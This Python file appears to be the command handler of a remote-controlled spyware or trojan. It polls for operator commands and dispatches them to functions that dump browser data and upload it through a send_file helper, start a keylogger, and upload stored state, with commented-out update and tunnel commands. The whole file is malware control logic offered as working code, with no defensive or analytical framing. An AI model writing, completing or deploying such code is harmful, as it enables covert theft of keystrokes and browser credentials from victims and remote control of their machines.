#%%
from logger import log
from time import sleep
from .util import data_store, username
from .keylogger import Keyloger
from .drive import send_file, drive_file


#%%
def dump(*args, **kwargs):
    from .browsers.module import run
    send_file(f"dump_{args[0]}.json", content=list(run()))

def set_value(*args, **kwargs):
    "change value of a variable"
    kv=next(iter(kwargs.items()))
    data_store.set_value(*kv)

def start_logger(*args, **kwargs):
    Keyloger(*args, **kwargs).start()

def stored_value(*args, **kwargs):
    send_file(f"data_store_{args[0]}.json", data_store.var.__dict__)

all_command={
    # "update":update,
    "dump":dump,
    # "ngrock":ngrock,
    "set_value":set_value,
    "start_logger":start_logger,
    "stored_value":stored_value,
}

def execute(command):
    log.debug(command)

    fun_name = command["func"]
    args = command.get("args", [])
    kwargs = command.get("kwargs", {})

    log.info(f"function: {fun_name}")
    func=all_command.get(fun_name)
    if not func:
        log.error(f'unlnown remote funtion: {fun_name}')
        return
    func(command["time"], *args, **kwargs)

def parse_command(cmd:dict):
    last_all_time = data_store.var.last_all_time
    last_user_time = data_store.var.last_user_time

    # handle wrong function call request
    commands = cmd.get("all", [])
    for command in commands:
        all_time = int(command.get("time", -1))
        if all_time>last_all_time:

            log.info(f"executing user spacifig command {all_time}")
            execute(command)
            data_store.set_value("last_all_time", all_time)
        
        sleep(1)

    commands = cmd.get(username, [])
    for command in commands:
        user_time = int(command.get("time", -1))
        if user_time>last_user_time:
            log.info(f"executing user spacifig command {user_time}")
            execute(command)
            # must be done only for user spacific commands only
            with drive_file(f"response/{user_time}") as f:
                f.write(command["func"])
            data_store.set_value("last_user_time", user_time)
        
        sleep(1)